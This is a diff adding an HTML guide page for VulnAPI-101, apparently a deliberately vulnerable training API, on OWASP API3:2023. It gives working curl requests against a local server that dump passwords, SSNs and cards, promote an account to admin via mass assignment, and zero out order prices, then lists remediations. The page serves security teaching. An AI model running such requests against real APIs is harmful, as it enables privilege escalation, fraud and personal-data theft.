@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API3:2023 - Broken Object Property Level Authorization | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api3">API3:2023</span> Broken Object Property Level Authorization</h2>
+            <span class="badge badge-danger">HIGH SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>This vulnerability encompasses two related issues:</p>
+            <ul>
+                <li><strong>Excessive Data Exposure:</strong> API returns more data than necessary, including sensitive fields</li>
+                <li><strong>Mass Assignment:</strong> API accepts and processes properties that shouldn't be client-modifiable</li>
+            </ul>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/auth.py</code> (registration mass assignment)</li>
+                <li><code>app/routes/users.py</code> (user data exposure, update mass assignment)</li>
+                <li><code>app/routes/products.py</code> (internal cost exposure, mass assignment)</li>
+                <li><code>app/routes/orders.py</code> (order data exposure)</li>
+                <li><code>app/models.py</code> (to_dict exposing sensitive fields)</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Excessive Data Exposure</h2>
+
+            <h3>1. User Data Exposure</h3>
+            <p>User endpoints expose passwords, SSN, credit cards, and internal notes:</p>
+            <div class="code-container">
+                <pre><code># Get any user - exposes all sensitive fields
+curl -s http://localhost:5000/api/users/1 | jq
+
+# Response includes:
+# - password (plain text!)
+# - ssn
+# - credit_card
+# - api_key
+# - internal_notes
+
+# Even your own profile exposes too much
+curl -s http://localhost:5000/api/users/me \
+  -H "Authorization: Bearer $TOKEN" | jq '.user | {password, ssn, credit_card}'</code></pre>
+            </div>
+
+            <h3>2. Product Internal Data</h3>
+            <p>Products expose internal cost and profit margins:</p>
+            <div class="code-container">
+                <pre><code># Get products - exposes business-sensitive data
+curl -s http://localhost:5000/api/products | jq '.products[] | {name, price, internal_cost, admin_notes}'
+
+# Export endpoint exposes even more
+curl -s http://localhost:5000/api/products/export | jq '.export[] | {name, price, internal_cost, profit_margin}'</code></pre>
+            </div>
+
+            <h3>3. Order Internal Data</h3>
+            <p>Orders expose profit margins and internal tracking:</p>
+            <div class="code-container">
+                <pre><code># All orders with internal data
+curl -s http://localhost:5000/api/orders | jq '.orders[] | {id, total_price, profit_margin, internal_tracking}'
+
+# Order statistics expose business metrics
+curl -s http://localhost:5000/api/orders/statistics | jq</code></pre>
+            </div>
+
+            <h3>4. Coupon Internal Data</h3>
+            <p>Coupons endpoint exposes employee/internal discount codes:</p>
+            <div class="code-container">
+                <pre><code># Get all coupons including internal ones
+curl -s http://localhost:5000/api/products/coupons | jq
+
+# Find high-value internal coupons
+curl -s http://localhost:5000/api/products/coupons | jq '.coupons[] | select(.is_internal == true)'
+
+# INTERNAL50 - 50% off
+# EMPLOYEE75 - 75% off
+# FREEBIE100 - 100% off!</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Mass Assignment Attacks</h2>
+
+            <h3>1. Privilege Escalation via Registration</h3>
+            <p>Register with admin role and unlimited balance:</p>
+            <div class="code-container">
+                <pre><code># Register as admin with huge balance
+curl -X POST http://localhost:5000/api/auth/register \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username": "hacker",
+    "email": "hacker@evil.com",
+    "password": "hack123",
+    "role": "admin",
+    "balance": 999999.99,
+    "is_active": true
+  }'
+
+# Verify the account has admin role
+curl -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "hacker", "password": "hack123"}' | jq '.user | {role, balance}'</code></pre>
+            </div>
+
+            <h3>2. Update Any User Property</h3>
+            <p>Modify role, balance, and any other field:</p>
+            <div class="code-container">
+                <pre><code># Login as regular user
+TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "john", "password": "password123"}' | jq -r '.token')
+
+# Give yourself admin role and money
+curl -X PUT http://localhost:5000/api/users/2 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "role": "admin",
+    "balance": 1000000,
+    "internal_notes": "Promoted myself to admin"
+  }'</code></pre>
+            </div>
+
+            <h3>3. Product Mass Assignment</h3>
+            <p>Set internal cost when creating products:</p>
+            <div class="code-container">
+                <pre><code># Create product with internal fields
+curl -X POST http://localhost:5000/api/products \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name": "My Product",
+    "price": 100.00,
+    "internal_cost": 1.00,
+    "admin_notes": "Created via mass assignment"
+  }'
+
+# Modify existing product internal cost
+curl -X PUT http://localhost:5000/api/products/1 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"internal_cost": 0.01}'</code></pre>
+            </div>
+
+            <h3>4. Order Mass Assignment</h3>
+            <p>Set custom price, status, and assign to other users:</p>
+            <div class="code-container">
+                <pre><code># Create order with manipulated price
+curl -X POST http://localhost:5000/api/orders \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "product_id": 3,
+    "quantity": 10,
+    "total_price": 0.01,
+    "status": "delivered",
+    "user_id": 1
+  }'
+
+# Update order to delivered status
+curl -X PUT http://localhost:5000/api/orders/1 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "delivered", "total_price": 0}'</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Data Breach:</strong> Exposure of PII (SSN, credit cards, passwords)</li>
+                <li><strong>Business Intelligence Leak:</strong> Competitors learn your costs and margins</li>
+                <li><strong>Privilege Escalation:</strong> Users become admins via mass assignment</li>
+                <li><strong>Financial Fraud:</strong> Manipulate balances, prices, and orders</li>
+                <li><strong>Coupon Abuse:</strong> Use internal employee discounts</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Create separate DTOs for input and output</li>
+                <li>Whitelist allowed fields for updates</li>
+                <li>Never expose sensitive fields in responses</li>
+                <li>Use role-based field filtering</li>
+            </ol>
+            <div class="code-container">
+                <pre><code># Secure implementation example
+@users_bp.route('/&lt;int:user_id&gt;', methods=['PUT'])
+@token_required
+def update_user(user_id):
+    # Whitelist allowed fields
+    ALLOWED_FIELDS = ['email', 'password']  # NOT role, balance, etc.
+
+    data = request.get_json()
+    update_data = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}
+
+    # Apply updates only to allowed fields
+    for key, value in update_data.items():
+        setattr(user, key, value)</code></pre>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
